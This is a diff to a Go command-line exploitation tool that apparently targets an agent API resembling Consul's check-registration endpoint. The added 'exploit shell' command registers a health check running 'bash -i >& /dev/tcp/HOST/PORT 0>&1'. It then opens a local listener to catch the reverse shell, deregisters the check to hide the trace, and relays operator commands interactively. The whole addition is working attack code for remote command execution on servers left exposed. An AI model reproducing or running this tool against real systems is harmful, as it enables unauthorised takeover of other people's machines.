@@ -1,12 +1,14 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"strconv"
@@ -19,6 +21,7 @@ import (
 )
 
 var target = ""
+var base = ""
 
 type vulnerable struct {
 	Config struct {
@@ -497,6 +500,12 @@ ___.               .___.__                  .__    .__
 			getStatus(target)
 		case strings.HasPrefix(line, "exploit metadata"):
 			getMeta(target)
+		case strings.HasPrefix(line, "exploit shell"):
+			parts := strings.Split(line, " ")
+			rhost := parts[2]
+			rport := parts[3]
+			lport := parts[4]
+			getShell(target, rhost, rport, lport)
 		case line == "login":
 			pswd, err := l.ReadPassword("please enter your password: ")
 			if err != nil {
@@ -611,17 +620,20 @@ func getMeta(base string) {
 		time.Sleep(20 * time.Second)                                // Run for some time to simulate work
 		s.Stop()
 		getHTTPOutput(base)
-		deregisterCheck(base)
+		deregisterCheck(base, "Test")
 
+	} else {
+		fmt.Println(resp.StatusCode)
+		fmt.Println("something went wrong")
 	}
 }
 
-func deregisterCheck(base string) {
+func deregisterCheck(base string, checkid string) {
 
-	urls := base + "/v1/agent/check/deregister/Test"
+	urls := base + "/v1/agent/check/deregister/" + checkid
 
 	checks := Check{
-		ID: "Test",
+		ID: checkid,
 	}
 
 	// initialize http client
@@ -682,4 +694,120 @@ func getHTTPOutput(url string) (bool, error) {
 	fmt.Printf("ID: %v\n", results.TEST.CheckID)
 	fmt.Printf("%v\n", red(results.TEST.Output))
 	return false, err
+}
+
+func getShell(base string, host string, port string, lport string) {
+
+	urls := base + "/v1/agent/check/register"
+	//urls := "https://webhook.site/55406cec-59a6-4799-8f58-9c475c28a802"
+
+	payload := fmt.Sprintf(`{"id": "Test2","name": "Test2","args": ["bash","-c","bash -i >& /dev/tcp/%v/%v 0>&1"],"interval": "10s"}`, host, port)
+
+	checks := []byte(payload)
+
+	// initialize http client
+	client := &http.Client{}
+
+	// set the HTTP method, url, and request body
+	req, err := http.NewRequest(http.MethodPut, urls, bytes.NewBuffer(checks))
+	if err != nil {
+		panic(err)
+	}
+
+	// set the request header Content-Type for json
+	req.Header.Set("Content-Type", "application/json; charset=utf-8")
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+
+	if resp.StatusCode == 200 {
+		fmt.Println("----")
+		fmt.Println("Check Registered")
+		fmt.Println("Waiting for callback...")
+		s := spinner.New(spinner.CharSets[9], 100*time.Millisecond) // Build our new spinner
+		s.Start()                                                   // Start the spinner
+		time.Sleep(5 * time.Second)                                 // Run for some time to simulate work
+		s.Stop()
+		nc(base, host, port, lport)
+
+	} else {
+		fmt.Println(resp.Body)
+		fmt.Println(resp.StatusCode)
+
+	}
+}
+
+func nc(base string, host string, port string, lport string) {
+	listener, err := net.Listen("tcp", ":"+lport)
+	if err != nil {
+		log.Fatalln("Unable to bind to port")
+	}
+	log.Println("Listening on localhost:" + port)
+	for {
+		// Wait for connection. Create net.Conn on connection established.
+		conn, err := listener.Accept()
+		deregisterCheck(base, "Test2")
+		if err != nil {
+			log.Fatalln("Unable to accept connection")
+		}
+
+		fmt.Println("Client " + conn.RemoteAddr().String() + " connected.")
+		tmp := make([]byte, 10000)
+		for i := 1; i < 3; i++ {
+			err := conn.SetReadDeadline(time.Now().Add(1 * time.Second))
+			_, err = conn.Read(tmp)
+			if err != nil {
+				if err != io.EOF {
+					fmt.Println("read error:", err)
+				}
+				break
+			}
+		}
+		// Handle the connection. Using goroutine for concurrency.
+		go handleConnection(conn)
+	}
+}
+
+func handleConnection(conn net.Conn) {
+	// Create new reader from Stdin.
+	reader := bufio.NewReader(os.Stdin)
+
+	// run loop forever, until exit.
+	for {
+		defer conn.Close()
+		// Prompting message.
+		fmt.Print("bash-$: ")
+
+		// Read in input until newline, Enter key.
+		input, _ := reader.ReadString('\n')
+		if input == "exit\n" {
+			conn.Close()
+			start()
+		}
+
+		// Send to socket connection.
+		conn.Write([]byte(input))
+
+		for i := 1; i < 3; i++ {
+			defer conn.Close()
+			err := conn.SetReadDeadline(time.Now().Add(1 * time.Second))
+			b := make([]byte, 100000)
+
+			size, err := conn.Read(b)
+			if err != nil {
+				if err != io.EOF {
+					fmt.Println("read error:", err)
+				}
+				break
+			}
+
+			path := string(b[0:size])
+			if !strings.Contains(path, "bash") {
+				fmt.Println(path)
+			}
+
+		}
+
+	}
 }
